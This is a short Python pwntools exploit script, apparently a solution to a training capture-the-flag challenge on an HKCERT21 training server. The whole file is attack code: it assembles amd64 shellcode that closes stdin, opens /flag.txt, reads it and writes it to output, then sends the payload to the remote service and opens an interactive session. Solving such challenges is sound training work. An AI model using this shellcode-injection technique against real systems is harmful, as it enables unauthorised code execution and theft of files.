from pwn import *

context(arch='amd64',os='linux',log_level='debug')
elf = ELF('./bin/chall')
p = elf.process()
p = remote('chal.training.hkcert21.pwnable.hk', 6008)

shellcode = ''
shellcode += shellcraft.amd64.linux.syscall('SYS_close', 0).rstrip()
shellcode += shellcraft.amd64.linux.open('/flag.txt', 0).rstrip()
shellcode += shellcraft.amd64.linux.syscall('SYS_read', 0, 'rsp', 40).rstrip()
shellcode += shellcraft.amd64.linux.syscall('SYS_write',1, 'rsp', 40).rstrip()
shellcode += shellcraft.amd64.linux.syscall('SYS_exit', 0)
p.sendlineafter('):\n', asm(shellcode))
p.interactive()